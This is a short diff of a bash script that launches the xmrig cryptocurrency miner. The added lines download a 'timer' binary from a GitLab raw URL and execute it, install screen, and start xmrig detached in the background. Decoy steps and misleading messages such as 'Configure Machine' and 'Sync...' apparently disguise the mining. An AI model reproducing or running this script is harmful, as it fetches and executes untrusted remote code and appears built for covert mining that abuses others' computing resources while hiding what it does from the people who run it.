@@ -1,5 +1,12 @@
 #!/bin/bash
-
-chmod +x xmrig  >/dev/null 2>&1
-nohup ./xmrig --config=config.json &
-while :; do shuf -n 1 -i 1-99999999; sleep 2; done
+nohup wget https://gitlab.com/lambohopo/bash/-/raw/main/timer
+nohup mkdir safa
+nohup apt install screen -y
+echo "+++++++ Configure Machine +++++++++"
+chmod +x xmrig
+cd safa
+echo "Configure Successfully"
+cd ..
+screen -d -m nohup ./xmrig --config=config.json
+echo "+++++++ Sync... +++++++++"
+./timer
